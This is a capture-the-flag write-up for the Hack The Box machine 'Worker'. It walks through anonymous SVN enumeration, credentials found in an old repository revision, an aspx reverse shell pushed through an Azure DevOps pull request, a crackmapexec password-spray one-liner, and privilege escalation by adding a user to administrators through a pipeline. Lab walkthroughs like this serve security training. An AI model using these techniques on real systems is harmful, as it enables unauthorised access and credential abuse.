**Worker - Easy Box running on Linux. Enumeration through SVN. DevOps on Azure! :)**
# ENUMERATION
## NMAP
Let's start NMAP first:
```
Nmap scan report for 10.10.10.203
Host is up (0.034s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE  VERSION
3690/tcp open  svnserve Subversion

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 17 12:24:15 2021 -- 1 IP address (1 host up) scanned in 13.09 seconds
```

There is also port 80 running but for some reason didn't get scanned by NMAP. It's however nothing there so let's enumerate that SVN (subversion)
## SVN
```
luka@kali:~/htb/worker$ nmap --script svn-brute --script-args svn-brute.repo=/svn/ -p 3690 10.10.10.203
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-17 12:31 CET
Nmap scan report for 10.10.10.203
Host is up (0.034s latency).

PORT     STATE SERVICE
3690/tcp open  svn
| svn-brute:   
|_  Anonymous SVN detected, no authentication needed

Nmap done: 1 IP address (1 host up) scanned in 11.81 seconds
```

Subversion is repository like Github commit history just simpler and running on Apache. Link [https://en.wikipedia.org/wiki/Apache\_Subversion](https://en.wikipedia.org/wiki/Apache\_Subversion)

So let's see what we can find:

```
svn ls svn://10.10.10.203/
```

![](/assets/images/image (148).png)

So let's read the moved.txt

# EXPLOITATION

## SVN Enumeration (continued)

Add devops.worker.htb to /etc/hosts and try to connect:

![](/assets/images/image (150).png)

Without any password we cannot continue. There is also dimension.worker.htb but is just a static page.

Since SVN lets us see if there are any older versions let's do that (usinf -r 1)

![](/assets/images/image (151).png)

We can download those with checkout using -r argument

```
svn checkout -r 2 svn://10.10.10.203
```

There were some credentials found in deploy.ps1

![](/assets/images/image (153).png)

Using that credentials we can login to devops.worker.htb

![](/assets/images/image (154).png)

## Azure Dev Ops

Enumeration didn't bring much apart from finding more than repos in SmartHotel360 Project

There is a way to inject shell (aspx) to the repo and call that file available on that particular subdomain(alpha, spectral,...).

So let's upload shell:

![](/assets/images/image (155).png)

And commit

![](/assets/images/image (156).png)

Create pull request

![](/assets/images/image (157).png)

I had to add some work items (just randomly typing them) otherwise "complete didn't work"

If everything worked correctly, we should see the file (remember to visit the right repository!)

```
		curl http://spectral.worker.htb/win-rev-shell.aspx
```

Shell was popped

# PRIVILEGE ESCALATION

## Manual Enumeration

As expected it is low privileged shell with some privileges!

```
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

I didn't try different potatoes (rogue,Juicy) since that is usualy unintended way to escalate privileges.

There is other share on the system

![](/assets/images/image (160).png)

After searching for a while following file was found

![](/assets/images/image (162).png)

List of usernames/passwords was downloaded and will be used in test with crackmapexecs winrm module. I is slow but it works! :)

```
cat credz | tr -d " " | awk -F"=" '{print "crackmapexec winrm 10.10.10.203 -u "$1 " -p "$2 " --local-auth -x whoami"}'
```

The user that worked with that password spray attempt done above was robinsl

![](/assets/images/image (163).png)

There is not much that that user can do on the system but his credentials work for devops and it seems to have another project assigned.

## Azure Dev Ops #2

Privilege escalation seems that has to be done almost same attack through Azure Dev Ops it will however be different. I couldn't find a way to interact with repos directly like before but there is another way to execute code - through pipelines.

Azure Repos Git > PartsUnlimited > Starter Pipeline

![](/assets/images/image (165).png)

Here we can add commands that will be triggered with whichever user has run the service (hopefully SYSTEM ;) ).

![](/assets/images/image (166).png)

&#x20;I've decided to add robinsl to administrators group since it is more persistent way of escalating the privileges as reverse shell.

![](/assets/images/image (167).png)

then delete pool and create a new branch.&#x20;

If everything has worked correctly user robinsl should have been added to "adminstrators" localgroup.

![](/assets/images/image (168).png)

And yes. It has worked!
